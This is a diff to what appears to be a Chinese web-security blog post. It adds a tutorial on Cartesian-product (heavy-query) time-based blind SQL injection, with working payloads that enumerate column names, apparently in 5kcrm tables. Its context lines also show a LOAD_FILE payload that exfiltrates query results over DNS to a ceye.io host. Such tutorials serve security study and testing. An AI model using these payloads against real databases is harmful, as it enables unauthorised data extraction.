@@ -882,6 +882,27 @@
 <p>由此Paylaod就为</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(查询语句),<span class="string">&#x27;.t6n089.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>
 
+<h1 id="笛卡尔积注入"><a href="#笛卡尔积注入" class="headerlink" title="笛卡尔积注入"></a>笛卡尔积注入</h1><p>遇到不能使用括号，或者shell()函数不能使用的情况下。</p>
+<p>具体数学实现就不说了，大概就是如下图：</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_5ERbl7aIV2.png"></p>
+<p>也就是说数字1先去乘以ABC，然后数字2再去乘以ABC，然后数字3再去乘以ABC，是不是感觉很熟悉，其实就是Burp suite里面的Intruder模块的Attack type里面的Clutser bomb攻击方式。</p>
+<p>这样逐渐的去相乘，然后就会有个时间。所以又叫大负荷查询，大负荷注入。</p>
+<p>Payload：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p>当where 1&#x3D;1时存在延时，where 1&#x3D;2时不延时，就说明存在时间盲注。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,b.column_name <span class="keyword">from</span> information_schema.tables a <span class="keyword">join</span> information_schema.columns b <span class="keyword">join</span> information_schema.columns c <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>列 ： 判断5kcrm_user表名下name列前两位是否为’ad’开头的内容，如果存在则延时</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="number">5</span>kcrm_action_log <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,b.column_name <span class="keyword">from</span> information_schema.columns b <span class="keyword">where</span> b.column_name regexp <span class="type">binary</span> <span class="string">&#x27;^ad&#x27;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>不延时，说明数据库中无adddxxx开头的列名。然后通过循环遍历所有字符，获取到数据库中所有列名，同样的方法可以获取表名</p>
+<p>其他以此类推</p>
 ]]></content>
       <categories>
         <category>Web安全</category>
